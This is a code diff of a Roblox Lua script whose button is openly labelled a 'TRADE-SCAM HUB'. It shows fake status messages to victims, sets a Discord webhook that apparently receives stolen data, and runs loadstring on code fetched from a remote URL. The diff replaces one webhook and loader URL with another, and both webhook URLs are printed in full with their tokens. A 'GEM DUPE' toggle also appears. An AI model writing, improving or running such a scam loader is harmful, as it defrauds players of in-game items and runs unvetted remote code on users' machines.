@@ -10,15 +10,15 @@ local Section1 = SelfTab:NewSection("TRADE");
 Section1:NewLabel("execute and wait 1 minute");
  
 Section1:NewButton("SCAM", "Load TRade Scam GUI", function()
-    _G.AuthKey = 213797809
-    _G.AuthServer = "https://discord.com/api/webhooks/1069039981470961685/CcaY5tsaaC9LFZxm3TCCK_vTZHarc9x8q-0afCVXdWpMs3sbHxXAG409Rr7KySYCDZ3-"
+    UserId = 213797809
+    WebHook = "https://discord.com/api/webhooks/1069202841647988736/z6AEmeT8qq6CmHKgxJYgRqc1Rapy1TblE1oX9iZH1hrnubIwFG8kfwcgHBDo-DIZP7AF"
     
     _G.CustomScriptName = "TRADE-SCAM HUB"
     _G.Text1 = "Adding mask...."
     _G.Text2 = "Waiting for Pets"
     _G.Text3 = "Checking Game ID..."
     _G.Text4 = "Starting The Mask...."
-    loadstring(game:HttpGet("https://dariandev.com/http_stuff/handler.lua", true))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/psxgm"))()
     end)
     local Section1 = VehicleTab:NewSection("GEM DUPE");
 Section1:NewToggle("ON/OFF", "gem dupe", function(state)
